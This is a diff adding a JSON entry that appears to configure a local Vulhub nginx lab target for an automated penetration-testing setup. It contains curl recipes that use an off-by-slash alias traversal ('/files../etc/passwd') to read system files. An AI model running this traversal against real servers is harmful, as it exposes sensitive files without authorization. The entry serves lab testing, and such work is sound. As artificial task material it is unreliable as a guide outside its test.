@@ -1,0 +1,18 @@
+{
+  "name": "Vulhub-nginx-insecure-configuration",
+  "kind": "single-web-app-container",
+  "target": "http://127.0.0.1:8097",
+  "abstract_family": "info_leak_fileread",
+  "isolation_note": "Vulhub nginx/insecure-configuration (off-by-slash alias misconfig on :8081 -> mapped to host 8097), bound to 127.0.0.1 only. Owned, disposable local lab. Ports 8096/8098 are the redirect/CSP misconfigs (not file-read).",
+  "eta_fill": {"login": "/", "wordlist": "/usr/share/wordlists/dirb/common.txt", "webshell": "/", "file": "/etc/passwd"},
+  "eta_recipes": {
+    "http_fingerprint": "curl -s -i \"{target}/\"",
+    "content_retrieval": "curl -s \"{target}/\"",
+    "web_path_enumeration": "curl -s \"{target}/files/\"",
+    "vulnerability_check": "curl -s --path-as-is \"{target}/files../etc/passwd\"",
+    "exploit_attempt": "curl -s --path-as-is \"{target}/files../etc/passwd\"",
+    "sensitive_file_read": "curl -s --path-as-is \"{target}/files../etc/passwd\""
+  },
+  "recommended_first": false,
+  "rationale": "nginx off-by-slash alias traversal (`location /files { alias /home/; }` -> /files../ == /home/.. == /). Real misconfig fingerprint for the information-leak / directory-traversal family (① + ④), which had NO Vulhub representative before. Process = enumerate (autoindex /files/) -> discover the off-by-slash -> read /etc/passwd. nginx has NO command execution, so this is a FILE-READ-MILESTONE box (like php-inclusion / rails): the full cmd-exec+file goal is unreachable by design; it reaches the read_files milestone only. Payload to be empirically confirmed."
+}
